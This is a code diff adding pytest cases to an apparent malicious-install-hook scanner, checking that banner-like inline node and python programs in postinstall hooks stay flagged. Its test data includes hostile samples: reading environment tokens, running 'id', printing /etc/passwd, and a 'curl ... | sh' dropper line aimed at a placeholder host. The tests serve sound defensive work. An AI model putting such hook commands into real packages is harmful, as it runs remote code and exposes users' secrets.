@@ -143,6 +143,70 @@ class TestAnInlineProgramInAConsumerHook:
         assert INLINE not in HookKit.rules(result)
 
 
+class TestABannerIsNotAWayAroundTheShape:
+    """An inline program stays a finding however much it looks like a banner.
+
+    Measured on the dev sets, exempting a program whose every statement only prints string literals
+    frees one legitimate unit and costs four malicious ones (one family, each blocked by content only
+    by this rule), so the rule stays strict: a hook that carries any inline program is a finding.
+    These are the programs an attacker would put behind a banner or in place of one; each must keep
+    the finding and the block."""
+
+    @pytest.mark.parametrize(
+        "program",
+        [
+            "console.log('thanks for installing')",
+            "console.log('a');console.error('b')",
+            "console.log(require('child_process').execSync('id'))",
+            "console.log(`${process.env.TOKEN}`)",
+            "console.log('hi');fetch('https://x.invalid/')",
+            "console.log('hi'); eval('1')",
+            "console.log('hi')\nrequire('x')",
+            "console.log('a' + b)",
+            "console.log('a' + 'b')",
+            "console.log('a'.repeat(3))",
+            "console['log']('x')",
+            "console.log(String.fromCharCode(104))",
+            "console.log('x') // note",
+            "console.log('x'),process.exit(0)",
+            "console.log(tag`a`)",
+            "console.log(1)",
+            "console.log(x)",
+            "process.stdout.write('x')",
+            "console.log('x')&&require('y')",
+            "import('child_process')",
+        ],
+    )
+    def test_a_node_program_keeps_the_finding(self, tmp_path: Path, program: str) -> None:
+        result = HookKit.result(tmp_path, {"postinstall": f'node -e "{program}"'})
+        assert INLINE in HookKit.rules(result)
+        assert HookKit.blocks(result)
+
+    @pytest.mark.parametrize(
+        "program",
+        [
+            "print('installed')",
+            "print('a');import os;os.system('id')",
+            "print(open('/etc/passwd').read())",
+            "print(f'{x}')",
+            "print('a' % b)",
+            "print('a', end=chr(10))",
+            "print('a');exec('1')",
+            "print(b'a')",
+            "print(1)",
+        ],
+    )
+    def test_a_python_program_keeps_the_finding(self, tmp_path: Path, program: str) -> None:
+        result = HookKit.result(tmp_path, {"postinstall": f"python3 -c '{program}'"})
+        assert INLINE in HookKit.rules(result)
+
+    def test_a_banner_beside_shell_work_does_not_hide_it(self, tmp_path: Path) -> None:
+        hook = {"postinstall": "node -e \"console.log('a')\" && curl -s https://x.invalid/s | sh"}
+        result = HookKit.result(tmp_path, hook)
+        assert "MALWARE.DROPPER.001" in HookKit.rules(result)
+        assert HookKit.blocks(result)
+
+
 class TestAHookThatRunsAFileTheScanDoesNotHold:
     @pytest.mark.parametrize(
         "hook",
